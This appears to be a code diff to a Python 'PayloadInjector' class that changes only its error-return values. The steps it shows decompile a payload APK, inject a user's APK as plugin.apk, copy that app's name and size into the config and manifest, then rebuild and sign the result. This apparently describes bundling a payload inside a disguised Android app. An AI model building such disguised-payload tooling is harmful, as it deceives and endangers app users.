@@ -91,25 +91,25 @@ class PayloadInjector:
             logger.info("📦 Step 1/6: Decompiling payload...")
             decompiled = await self._decompile_payload()
             if not decompiled:
-                return None, "Failed to decompile payload"
+                return None, "Failed to decompile payload", 0
             
             # Step 2: Extract user APK info
             logger.info("🔍 Step 2/6: Analyzing user APK...")
             app_info = await self._analyze_user_apk(user_apk_path)
             if not app_info:
-                return None, "Failed to analyze user APK"
+                return None, "Failed to analyze user APK", int(time.time() - start_time)
             
             logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")
             
             # Step 3: Replace plugin.apk
             logger.info("📋 Step 3/6: Injecting user APK...")
             if not await self._inject_plugin_apk(user_apk_path):
-                return None, "Failed to inject plugin.apk"
+                return None, "Failed to inject plugin.apk", int(time.time() - start_time)
             
             # Step 4: Update config.js
             logger.info("⚙️ Step 4/6: Updating config...")
             if not await self._update_config_js(app_info['name'], app_info['size']):
-                return None, "Failed to update config.js"
+                return None, "Failed to update config.js", int(time.time() - start_time)
             
             # Step 4.5: Update payload app name (AndroidManifest.xml)
             logger.info("📝 Step 4.5/6: Updating payload app name...")
@@ -125,7 +125,7 @@ class PayloadInjector:
             logger.info("🔨 Step 6/6: Building final APK...")
             final_apk = await self._rebuild_and_sign(output_path)
             if not final_apk:
-                return None, "Failed to build final APK"
+                return None, "Failed to build final APK", int(time.time() - start_time)
             
             duration = int(time.time() - start_time)
             logger.info(f"✅ Payload injection complete: {final_apk} (Duration: {duration}s)")
